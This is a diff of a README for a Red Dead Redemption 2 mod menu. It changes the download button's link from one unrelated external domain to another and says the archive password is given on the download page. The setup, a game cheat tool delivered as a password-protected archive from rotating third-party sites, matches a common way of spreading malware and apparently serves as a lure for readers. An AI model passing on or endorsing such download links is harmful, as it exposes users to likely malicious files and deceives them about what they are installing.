@@ -18,7 +18,7 @@ RDR2 mod menu — money drop, god mode, horse spawner, and story mod tools.
 
 ## Download
 
-[![Download v1.0.1491](https://img.shields.io/badge/Download_v1.0.1491-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/rdr2modmenu)
+[![Download v1.0.1491](https://img.shields.io/badge/Download_v1.0.1491-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/rdr2modmenu)
 
 > The archive password is shown on the download page.
 
